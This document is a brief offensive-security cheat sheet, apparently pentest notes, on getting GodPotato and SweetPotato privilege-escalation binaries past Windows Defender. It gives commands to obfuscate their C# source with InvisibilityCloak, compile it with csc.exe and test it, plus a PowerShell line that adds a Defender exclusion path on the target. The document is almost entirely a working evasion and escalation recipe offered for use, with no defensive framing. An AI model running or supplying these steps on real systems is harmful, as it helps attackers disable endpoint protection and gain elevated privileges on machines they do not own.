# InvisibilityCloak AV Evasion for Potato Tools

When standard potato binaries (GodPotato, SweetPotato) are flagged by Defender/AV based on string signatures, InvisibilityCloak obfuscates the source code by replacing known strings before compilation.

```bash
# on attacker Linux
git clone https://github.com/mintxelas/InvisibilityCloak
python3 InvisibilityCloak.py -f /path/to/GodPotato.cs -o GodPotatoObf.cs -m <method>
# method options: base64, rot13, reverse — pick one that beats the scanner
```

Compile on Windows:
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe GodPotatoObf.cs /out:GodPotato.exe
```

Test before deploying:
```powershell
# check if Defender flags the binary (a false-negative in test doesn't guarantee evasion at runtime)
.\GodPotato.exe -cmd "cmd /c whoami"
```

Defender exclusion path bypass (for compiling on the target without pre-obfuscation):
```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
```
